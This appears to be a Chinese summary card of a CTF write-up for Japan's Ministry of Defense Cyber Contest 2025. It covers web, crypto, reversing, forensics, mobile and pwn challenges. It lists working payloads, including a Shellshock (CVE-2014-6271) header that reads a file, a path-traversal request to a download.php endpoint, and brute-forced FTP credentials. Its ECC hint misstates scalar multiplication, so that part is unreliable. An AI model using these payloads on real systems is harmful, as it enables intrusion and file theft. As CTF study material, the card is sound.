---
title: "防衛省サイバーコンテスト2025 Writeup供養"
category: web
tags: ["防衛省サイバーコンテスト", "web", "Web-HTML注释flag", "JSON.php-base64数组", "ECC椭圆曲线", "Shellshock-CVE-2014-6271"]
signals: ["防衛省サイバーコンテスト 2025", "Web-HTML注释flag", "JSON.php-base64数组", "ECC椭圆曲线", "Shellshock-CVE-2014-6271", "FTP-pcap-密码爆破", "Android-NDK-crackme", "Brainfuck", "vsFTPd-3.0.3", "heap_exploit", "Writeup", "HTML", "flag", "download"]
difficulty: medium
source: "https://www.ctfiot.com/226942.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 防衛省サイバーコンテスト2025 Writeup供養

> 赛事：防衛省サイバーコンテスト 2025 | 方向：web | 难度：medium

## 一句话总结

防衛省サイバーコンテスト2025 Writeup供養多方向:HTML注释flag+石中剑+download.php读源+JSON base64数组+ECC椭圆曲线(a=56,b=58,p=127)求私钥+PeakeyEncode emoji隐写🚒😤🐈😡🙌+Brainfuck+vsFTPd密码爆破agita:zyyzzyzy+Android NDK SecretGenerater+Shellshock CVE-2014-6271+Cat game UAF+ct batch+pattern XOR

## 攻击链

1. WE-1: HTML注释 <!--flag{TakeMeToTheFlag}-->|WE-2: 石中剑(Stones)游戏|WE-3: download.php?fName=/etc/WE-3读文件 flag{fGrantUB56skBTlmF14mostFP}|WE-4: json.php POST data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0= base64+JSON array|CRYPTO: 椭圆曲线 a=56,b=58,p=127 基准点(42,67) 公开键(53,30)求私钥d|REVERSE-1: C语言质数计数 k=10000000 简单|REVERSE-2: Peakey Encode emoji隐写 flag{🚒,😤,🐈,😡,🙌,...}替换|REVERSE-3: Brainfuck代码|LOG: 192.168.100.106访问日志分析|FORENSIC: vsFTPd 3.0.3 密码爆破 agita:zyyzzyzy|MOBILE: Android NDK SecretGenerater.checkNative(str) 16字符比对 VUSTIq@H~]wGSBVH|PWN-1: Shellshock CVE-2014-6271 (){:;};echo;cat /etc/PW-1 flag{>:(!shellshock!}|PWN-4: Cat game PrintHeap/AllocateCat/Print/Free|ct batch: FDATA1-9生成flag{...}|pattern XOR: pattern1/2/3 XOR compare

## 关键 payload

```
data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn1d|data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=|ECCScalarMult(G, d)=(Px, Py) G=(42,67) P=(53,30) a=56 b=58 p=127|cur -X POST -d "fName=/etc/WE-3" https://we3-prod.2025winter-cybercontest.net/secret/download.php|AAA^AAsAABAA$AAnAACAA-AAmeow(PE)|USER agita PASS zyyzzyzy|(){:;};echo Content-type: text/plain;echo;/bin/cat /etc/PW-1
```

## 经验教训

1) HTML注释flag直接读<!--flag{...}-->; 2) JSON.php data base64 JSON数组: [{{name,value}},{name,flag,value,on}]; 3) ECC小素数暴力枚举:d in 1..p-1, kG=(d*42, d*67) mod p; 4) PeakeyEncode emoji替换:''>''→🚒 ''<''→😭 ''+''→😡 ''-''→🙌 ''.''→🌺 '',''→✍️ ''[''→😤 '']''→🐈; 5) vsFTPd 3.0.3 密码爆破+USER agita枚举; 6) Android NDK SecretGenerater.decode(str).equals("VUSTIq@H~]wGSBVH") 16字符; 7) Shellshock CVE-2014-6271:(){:;};echo Content-type:text/plain;echo;/bin/cat /etc/PW-1

## 标签

Web-HTML注释flag、JSON.php-base64数组、ECC椭圆曲线、Shellshock-CVE-2014-6271、FTP-pcap-密码爆破、Android-NDK-crackme、Brainfuck、vsFTPd-3.0.3、Android-APK、peakey-encode、emoji-steganography、pattern-XOR、ct-batch、cookie-deserialize

## 参考来源

- https://www.ctfiot.com/226942.html
- 原文件：防衛省サイバーコンテスト2025_Writeup供養.full.md
